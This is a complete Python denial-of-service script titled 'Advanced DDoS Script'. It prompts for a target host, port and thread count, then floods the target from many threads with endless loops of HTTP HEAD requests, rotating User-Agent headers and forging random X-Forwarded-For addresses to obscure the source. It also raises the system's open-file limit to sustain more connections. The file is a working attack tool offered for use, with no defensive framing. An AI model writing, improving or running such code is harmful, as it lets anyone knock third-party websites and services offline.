import socket
import os
import random
import platform
import threading
from time import sleep

def detect_system():
    print("Detecting System...")
    sys_os = platform.system()
    print(f"System detected: {sys_os}")
    if sys_os == "Linux":
        try:
            os.system("ulimit -n 1030000")
        except Exception as e:
            print(e)
            print("Could not optimize system settings.")
    else:
        print("Your system is not Linux. The script may not work optimally on this system.")

def random_ip():
    """Generate a random IP address."""
    return ".".join(str(random.randint(0, 255)) for _ in range(4))

def random_user_agent():
    """Generate a random User-Agent."""
    user_agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
        "Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Firefox/89.0",
        "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0",
    ]
    return random.choice(user_agents)

def attack(ip, port, url):
    """Perform the attack."""
    connection = "Connection: Keep-Alive\r\n"
    referer = f"Referer: {url}\r\n"
    user_agent = f"User-Agent: {random_user_agent()}\r\n"
    forward = f"X-Forwarded-For: {random_ip()}\r\n"
    get_host = f"HEAD {url} HTTP/1.1\r\nHost: {ip}\r\n"
    request = get_host + user_agent + referer + connection + forward + "\r\n\r\n"

    while True:
        try:
            atk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            atk.settimeout(5)  # Set timeout for connection
            atk.connect((ip, port))
            for _ in range(80):  # Number of requests per connection
                atk.send(request.encode())
            atk.close()
        except socket.error:
            sleep(0.1)
        except Exception as e:
            pass

def initiate_attack(ip, port, url, threads):
    """Initiate multiple attack threads."""
    print("[>>>] Starting the attack [<<<]")
    for _ in range(threads):
        thread = threading.Thread(target=attack, args=(ip, port, url))
        thread.daemon = True  # Allow program to exit even if threads are running
        thread.start()

if __name__ == "__main__":
    detect_system()
    print("Welcome to Advanced DDoS Script\n")
    ip = input("Enter Target IP/Domain: ").strip()
    port = int(input("Enter Target Port: "))
    url = f"http://{ip}"
    threads = int(input("Enter Number of Threads: "))
    
    initiate_attack(ip, port, url, threads)
    try:
        while True:
            sleep(1)  # Keep the main thread running
    except KeyboardInterrupt:
        print("\nAttack stopped.")
